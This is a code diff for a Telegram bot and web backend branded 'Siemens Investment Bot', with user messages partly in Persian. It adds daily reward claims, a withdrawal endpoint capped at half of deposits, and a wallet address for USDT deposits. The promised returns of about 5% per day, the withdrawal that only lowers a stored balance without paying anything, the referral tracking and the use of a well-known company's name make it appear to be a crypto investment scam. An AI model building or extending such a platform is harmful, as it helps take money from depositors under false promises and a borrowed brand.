@@ -18,7 +18,7 @@ const DB_FILE = path.join(__dirname, 'database.json');
 function readDatabase() {
 if (!fs.existsSync(DB_FILE)) {
 const defaultData = {
-"6559439220": { balance: 62.20, totalDeposited: 20.00, refCount: 0, voucherCount: 0 }
+"6559439220": { balance: 76.44, totalDeposited: 20.00, refCount: 0, voucherCount: 0, lastClaimDate: null }
 };
 fs.writeFileSync(DB_FILE, JSON.stringify(defaultData, null, 2));
 return defaultData;
@@ -36,7 +36,6 @@ fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-// API دریافت اطلاعات کاربر
 app.get('/api/user', (req, res) => {
 const userId = req.query.userId || '6559439220';
 const db = readDatabase();
@@ -46,36 +45,70 @@ db[userId] = {
 balance: 0.00,
 totalDeposited: 0.00,
 refCount: 0,
-voucherCount: 0
+voucherCount: 0,
+lastClaimDate: null
 };
 saveDatabase(db);
 }
+
+const today = new Date().toISOString().split('T')[0];
+const alreadyClaimedToday = db[userId].lastClaimDate === today;
 
 res.json({
 userId: userId,
 balance: db[userId].balance,
 totalDeposited: db[userId].totalDeposited,
 refCount: db[userId].refCount,
-voucherCount: db[userId].voucherCount
+voucherCount: db[userId].voucherCount,
+canWithdraw: db[userId].totalDeposited >= 20.00,
+maxWithdraw: (db[userId].totalDeposited * 0.5),
+alreadyClaimedToday: alreadyClaimedToday
 });
 });
 
-// API ثبت پاداش روزانه
 app.post('/api/claim-daily', (req, res) => {
 const { userId } = req.body;
 const db = readDatabase();
 if (!db[userId]) return res.json({ success: false, message: 'User not found' });
 
 if (db[userId].totalDeposited < 20.00) {
-return res.json({ success: false, message: 'Minimum deposit required is 20 USDT' });
+return res.json({ success: false, message: 'حداقل واریز برای دریافت پاداش ۲۰ تتر است.' });
+}
+
+const today = new Date().toISOString().split('T')[0];
+if (db[userId].lastClaimDate === today) {
+return res.json({ success: false, message: 'شما امروز پاداش خود را دریافت کرده‌اید. لطفاً فردا مراجعه کنید.' });
 }
 
 db[userId].balance += 1.00;
+db[userId].lastClaimDate = today;
 saveDatabase(db);
 res.json({ success: true, newBalance: db[userId].balance });
 });
 
-// API گردونه شانس
+app.post('/api/withdraw', (req, res) => {
+const { userId, amount } = req.body;
+const db = readDatabase();
+if (!db[userId]) return res.json({ success: false, message: 'User not found' });
+
+if (db[userId].totalDeposited < 20.00) {
+return res.json({ success: false, message: 'برای فعال شدن برداشت باید حداقل ۲۰ تتر واریز کرده باشید.' });
+}
+
+const maxAllowedWithdraw = db[userId].totalDeposited * 0.5;
+if (amount > maxAllowedWithdraw) {
+return res.json({ success: false, message: `حداکثر مبلغ قابل برداشت ۵۰ درصد مبلغ واریزی شما (${maxAllowedWithdraw} تتر) است.` });
+}
+
+if (amount > db[userId].balance) {
+return res.json({ success: false, message: 'موجودی حساب شما کافی نیست.' });
+}
+
+db[userId].balance -= amount;
+saveDatabase(db);
+res.json({ success: true, newBalance: db[userId].balance });
+});
+
 app.post('/api/spin', (req, res) => {
 const { userId } = req.body;
 const db = readDatabase();
@@ -91,7 +124,6 @@ saveDatabase(db);
 res.json({ success: true, reward, newBalance: db[userId].balance });
 });
 
-// API اطلاعات واریز
 const walletData = {
 status: 'success',
 address: MY_WALLET_ADDRESS,
@@ -99,7 +131,6 @@ network: 'BEP20 (USDT)'
 };
 app.get('/api/deposit', (req, res) => res.json(walletData));
 
-// --- ربات تلگرام ---
 function sendMainMenu(chatId, text) {
 bot.sendMessage(chatId, text, {
 reply_markup: {
@@ -123,6 +154,7 @@ balance: 0.00,
 totalDeposited: 0.00,
 refCount: 0,
 voucherCount: 0,
+lastClaimDate: null,
 referredBy: referrerId
 };
 if (referrerId && db[referrerId]) {
@@ -133,23 +165,6 @@ saveDatabase(db);
 sendMainMenu(chatId, 'Welcome to Siemens Investment Bot!');
 });
 
-bot.onText(/\/admin/, (msg) => {
-const chatId = msg.chat.id.toString();
-if (chatId !== ADMIN_CHAT_ID) return;
-
-const db = readDatabase();
-const users = Object.keys(db);
-let totalDep = 0;
-let totalBal = 0;
-users.forEach(u => {
-totalDep += db[u].totalDeposited || 0;
-totalBal += db[u].balance || 0;
-});
-
-const stats = '👑 *Admin Control Panel*\n\n👥 Total Users: *' + users.length + '*\n💰 Total Deposits: *' + totalDep.toFixed(2) + ' USDT*\n🏦 Total Balances: *' + totalBal.toFixed(2) + ' USDT*';
-bot.sendMessage(chatId, stats, { parse_mode: 'Markdown' });
-});
-
 bot.on('callback_query', async (query) => {
 try { await bot.answerCallbackQuery(query.id); } catch (e) {}
 
@@ -158,7 +173,7 @@ const data = query.data;
 const db = readDatabase();
 
 if (!db[chatId]) {
-db[chatId] = { balance: 0.00, totalDeposited: 0.00, refCount: 0, voucherCount: 0 };
+db[chatId] = { balance: 0.00, totalDeposited: 0.00, refCount: 0, voucherCount: 0, lastClaimDate: null };
 saveDatabase(db);
 }
 
@@ -172,6 +187,16 @@ const user = db[chatId];
 const dailyProfit = Math.floor((user.totalDeposited || 0) / 20) * 1;
 const text = '📊 *User Dashboard*\n\n💰 Total Deposit: *' + (user.totalDeposited || 0) + ' USDT*\n📈 Daily Profit: *' + dailyProfit + ' USDT/day*\n💵 Available Balance: *' + (user.balance || 0) + ' USDT*';
 bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
+}
+
+if (data === 'withdraw') {
+const user = db[chatId];
+if ((user.totalDeposited || 0) < 20.00) {
+bot.sendMessage(chatId, '⚠️ برای فعال شدن برداشت باید حداقل ۲۰ تتر واریز کرده باشید.');
+} else {
+const maxW = (user.totalDeposited * 0.5).toFixed(2);
+bot.sendMessage(chatId, `💸 *Withdrawal*\n\nحداکثر مبلغ قابل برداشت (۵۰٪ کل مبلغ واریزی): *${maxW} USDT*\n\nلطفاً از مینی‌اپ برای ثبت درخواست برداشت استفاده کنید.`);
+}
 }
 
 if (data === 'referral') {
